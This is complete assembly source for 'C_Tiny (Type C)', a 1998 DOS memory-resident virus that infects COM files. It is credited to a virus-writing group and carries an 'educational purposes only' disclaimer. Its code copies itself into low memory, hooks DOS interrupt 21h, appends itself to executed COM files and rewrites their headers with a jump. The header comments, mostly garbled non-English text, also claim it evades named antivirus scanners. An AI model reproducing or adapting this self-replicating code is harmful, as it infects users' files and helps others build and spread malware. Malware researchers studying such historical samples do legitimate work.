;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                            \\\\\\\  \       \   \\\\\\\
;        C_Tiny    (Type C)                 \          \     \   \
;                                           \           \   \    \    98/05
;                                           \            \ \     \
;                                            \\\\\\\      \       \\\\\\\ #04
;
; Virus Name : C_Tiny (Type C)
; Author     : Crom
; Group      : CVC
; Origin     : Corea
; Date       : 1998/03/21
; Type       : Memory resident COM
;
;  !*< ��I�� ���� >********************************************************!
;   *                                                                        *
;   * �w�� !                                                                 *
;   *        �� �����e �a�B�ⷥ ����a���e �a�w�A�ᴡ �s���a. �����e ��      *
;   *        �����i �a�wЁ�� �i���a�e ��� ���A�A ��Ё�ᕡ �����i ���� �g    *
;   *        �s���a. ���e �����e �i�i ���e �a�q�A�A ���s���a.                *
;   *                                                                        *
;   * Warning !                                                              *
;   *        This information is for educational purposes only. We are       *
;   *        not responsible for any problems caused by the use of this      *
;   *        information. Responsibility is entirely placed on the reader    *
;   *                                                                        *
;   !************************************************************************!
;
; �e�e�e ���w�� �a����a�� ������a �B�� �����a�A �w���e�a. (0020:0000)
; �a����a �w���� �� �w�b�A �A����a ���a ���ᴡ �a�a. �e�� ���w�b�A 0 �� �a��
; �a�e �t�� ��w�A�� ���a�e �a����a�e ����w���A �w�� �a�� �g�e�a.
; �a����, COM �a���e �q�q��ǡ�a �q�q �a���e �a���� �� ������ 'M' ���� ���a �e�a
;
; AVP,DSAV,F-PROT,SCAN,TBAV �A�� �e�� ���e�A�� �g�e�a. �e, F-PROT �������w�A�e
; ���e�� �E�a. �a�q���A�e ���e�A�� �g�i �����a.
;
; ������a �B�� �A���i�A �w�� �a�e �a����a�e �a���a �a�� �b�a�� �e�a.
;
; ���b�ⷥ ���w�� �a����a �A�b�A �|�� �A�e�ⷥ ���w���w�� ������a�B�� ����
; �a�A �w�� �a�e �a����a���a.
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL  TINY
            .CODE
            .286

            org   0h

 Mem_size   equ   offset End_Memory     ; �A���� �a��
 Vir_size   equ   offset End_virus      ; ���A �a����a �a��

 C_Tiny:
            mov   si, 100h
            push  si                    ; ��w
            mov   di, 0020h             ; AX = 0020h
            mov   es, di                ; ES = 0020h
            mov   cx, Mem_size          ; �a����a ���� �e�q ���a
            xor   di, di                ; ES:DI = 0020:0000h
 Check_IVT_Zero:
            repz  scasb                 ; 0020:0000 ~ �a����a �a���e�q 0 ����
            jnz   Restore_COM_Head      ; ���a�e�a.

 Copy_Vir_IVT:
            push  si
            mov   cl, Vir_size          ; �a����a ����
            xor   di,di                 ; ���a �i �� (0020:0000h)
            db    2Eh                   ; CS:SI -> ES:DI
            repz  movsb                 ; ���a !
            pop   si                    ;

            xor   ax,ax
            mov   ds,ax
            mov   di, offset End_Virus
            mov   ax, offset NewInt21
            cli                         ; Int 21h �a������
            xchg  ax, ds:[0084h]
            stosw                       ; �A�a���a �e�w
            mov   ax,0020h
            xchg  ax, ds:[0086h]
            stosw
            sti

 Restore_COM_Head:
            push  cs                    ; cs=ds=es
            pop   ds
            push  cs
            pop   es
            pop   si                    ; SI ����
            add   si, offset OldCOMHead ; COM �|���� ���� ���e
            mov   di,101h               ; COM �|���� ����
            dec   di                    ; DI = 100h
            push  di                    ; �����i ���� ��w
            movsw                       ; 4 �a���a ����
            movsw                       ;
            ret                         ; CS:100h �� ����

 OldCOMHead db    90h,90h,0CDh,20h      ; ���� COM �|����
            db    'C_Tiny.C'            ; �a����a ���q

 Set_Pnt:
            mov   ah,42h                ; ͡����
            xor   cx,cx
            cwd
            int   21h
            ret

 call_Int21:
            xor   ah,0F0h               ;
            int   21h                   ;
            ret

 NewInt21:
            pusha                       ; 286 + �A�� ����
            push  ds
            push  es

            xor   ah,4Bh                ; ��З���a ?
            jnz   Error

            mov   ax, (3D02h XOR 0F000h) ; �a�� �i��
            call  call_Int21
            jc    Error                 ; �i�� �A�� ?

            xchg  ax,bx                 ; BX = �a��Ѕ�i

            push  cs                    ; �A�a���a ɷ��
            pop   ds
            push  cs
            pop   es

            mov   ah, (3fh XOR 0F0h)    ; �a�� ����
            mov   cx, 4                 ; �a���a��
            mov   dx, offset OldCOMHead ; ���� ����
            call  call_Int21

            cmp   byte ptr OldCOMHead, 'M' ; �q�q�A���a / EXE �a�����a ?
            jz    Close

            mov   al,2                  ; �a�� �{�a�� ����
            call  Set_Pnt
            mov   word ptr C_Tiny+1, ax
            add   word ptr C_Tiny+1, 100h
            mov   word ptr Jump_Code, 0E94Dh ; ���i�a + ���a�t
            sub   ax,0004               ; ���a�t ���e
            mov   word ptr Jump_Code + 2, ax ;

            mov   ah, (40h XOR 0F0h)    ; �a����a �a��
            mov   cx, offset End_Virus  ; �a����a ����
            xor   dx,dx                 ; ���� ���a�U
            call  call_Int21

            xor   al,al                 ; �a�� ��q�a�� ����
            call  Set_Pnt

            mov   ah, (40h XOR 0F0h)    ; �|���� �a��
            mov   cx, 4                 ; �a���a ��
            mov   dx, offset Jump_Code  ; ���a�U
            call  call_Int21

 Close:
            mov   ah, (3Eh XOR 0F0h)    ; �a�� �h��
            call  call_Int21
 Error:
            pop   es
            pop   ds
            popa
 Jmp_Org_Int21:
            db    0EAh                  ; --> �a���a�� �a���A ��w
 End_Virus:
            dw    ?,?
 Jump_Code  dw    ?
            db    ?,?

 End_Memory:                            ; �A�����A�� �a����a �{
            END   C_Tiny

